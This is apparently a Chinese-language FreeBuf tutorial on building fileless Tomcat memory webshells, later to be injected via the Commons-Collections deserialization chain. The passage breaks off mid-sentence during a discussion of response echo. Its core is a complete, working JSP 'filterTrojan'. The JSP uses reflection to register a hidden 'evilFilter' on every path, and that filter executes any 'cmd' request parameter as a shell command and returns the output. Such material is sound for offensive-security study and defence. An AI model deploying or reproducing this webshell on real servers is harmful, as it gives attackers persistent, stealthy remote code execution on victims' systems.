---
title: 结合CC链注入无文件Tomcat内存马
url: https://www.freebuf.com/articles/web/354385.html
source: FreeBuf网络安全行业门户
date: 2023-01-06
fetch_date: 2025-10-04T03:10:26.782441
---

# 结合CC链注入无文件Tomcat内存马

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

结合CC链注入无文件Tomcat内存马

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

结合CC链注入无文件Tomcat内存马

2023-01-05 15:58:01

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

Tomcat内存马基础可以看我的上一篇：<https://www.0kai0.cn/?p=240>

## 前言-fliter等内存马局限

具体新建servlet的过程：<https://blog.csdn.net/gaoqingliang521/article/details/108677301>

新建一个servlet:

```
package org.example;
​
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
​
@WebServlet("/servlet")
public class servlet extends HttpServlet {
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{
resp.getWriter().write("hello servlet");
}
​
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
}
}
```

配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080/servlet。

![1672905177_63b681d9064e2704f0b3f.png!small?1672905176878](https://image.3001.net/images/20230105/1672905177_63b681d9064e2704f0b3f.png!small?1672905176878)

![1672905192_63b681e8d9d66e6d69cc8.png!small?1672905192958](https://image.3001.net/images/20230105/1672905192_63b681e8d9d66e6d69cc8.png!small?1672905192958)

自定义的filter:

```
import javax.servlet.*;
import java.io.IOException;
​
public class filterDemo implements Filter {
​
public void init(FilterConfig filterConfig) throws ServletException {
System.out.println("Filter 初始化创建");
}
​
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
System.out.println("执行过滤操作");

filterChain.doFilter(servletRequest,servletResponse);
}
​
public void destroy() {}
}
```

修改web.xml，指定url-pattern为`/demo`，也就是访问<http://localhost:8080/servlet/demo>时触发filter，一直刷新一直触发。

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
version="4.0">
​
<filter>
<filter-name>filterDemo</filter-name>
<filter-class>org.example.filterDemo</filter-class>
</filter>
​
<filter-mapping>
<filter-name>filterDemo</filter-name>
<url-pattern>/demo</url-pattern>
</filter-mapping>
​
</web-app>
```

分析之前在项目结构->模块->依赖里导入tomcat/lib的包。

Filter内存马代码：

```
// filterTrojan.jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
​
<%
Field appContextField = ApplicationContextFacade.class.getDeclaredField("context");
appContextField.setAccessible(true);
Field standardContextField = ApplicationContext.class.getDeclaredField("context");
standardContextField.setAccessible(true);
​
ServletContext servletContext = request.getSession().getServletContext();
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
​
Filter filter = new Filter() {
@Override
public void init(FilterConfig filterConfig) throws ServletException {

}
​
@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
if (request.getParameter("cmd") != null) {
boolean isLinux = true;
String osTyp = System.getProperty("os.name");
if (osTyp != null && osTyp.toLowerCase().contains("win")) {
isLinux = false;
}
String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
Scanner s = new Scanner(in).useDelimiter("\\A");
String output = s.hasNext() ? s.next() : "";
response.getWriter().write(output);
response.getWriter().flush();
}
chain.doFilter(request, response);
}
​
@Override
public void destroy() {
​
}
​
};
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName("evilFilter");
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
​
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
​
Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
Map filterConfigs = (Map) filterConfigsField.get(standardContext);
filterConfigs.put("evilFilter", filterConfig);
​
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName("evilFilter");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
​
out.println("Inject done");
%>
​
​
​
```

先访问一遍jsp文件，就能在pattern任意路径带上参数RCE。

![1672905227_63b6820b736fe47a716bd.png!small?1672905227504](https://image.3001.net/images/20230105/1672905227_63b6820b736fe47a716bd.png!small?1672905227504)

![1672905233_63b68211d8308d00527c0.png!small?1672905233846](https://image.3001.net/images/20230105/1672905233_63b68211d8308d00527c0.png!small?1672905233846)

但是无论是模拟动态注册的filter内存马，还是Listener、Servlet、valve内存马，都不是真正意义上的内存马，它们会输出在tomcat的目录下。

![1672905259_63b6822bb886f000131d0.png!small?1672905259668](https://image.3001.net/images/20230105/1672905259_63b6822bb886f000131d0.png!small?1672905259668)

比如上述运行的jsp，在CTALINA\_BASE环境的`work\Catalina\localhost\Servlet_web环境\org\apache\jsp`都有相应的文件。

![1672905265_63b6823135e3c6163172e.png!small?1672905264959](https://image.3001.net/images/20230105/1672905265_63b6823135e3c6163172e.png!small?1672905264959)

## Tomcat回显

而且根据不同的封装，jsp都内置了不同的获取request和response的方法。比如filter可以用ServletRequest获取；Listener用ServletRequestEvent获取；Servlet用HttpServletRequest获取；valve管道更是直接使用request和response对象。所以不用考虑回显问题。

但是反序列化通用的是注入字节码，要进行回显就需要获取request和response对象。

ApplicationFilterChain的lastServicedRequest 和 lastServicedResponse 都是静态变量。如果不是静态变量，还需要获取到对应的对象，才能获取到变量。

![1672905270_63b682363196d8763fa1e.png!small?1672905269916](https://image.3001.net/images/20230105/1672905270_63b682363196d8763fa1e.png!small?1672905269916)

在ApplicationFilterChain的static部分，static部分都是优先执行。ApplicationDispatcher.WRAP\_SAME\_OBJECT默认False，所以lastServic...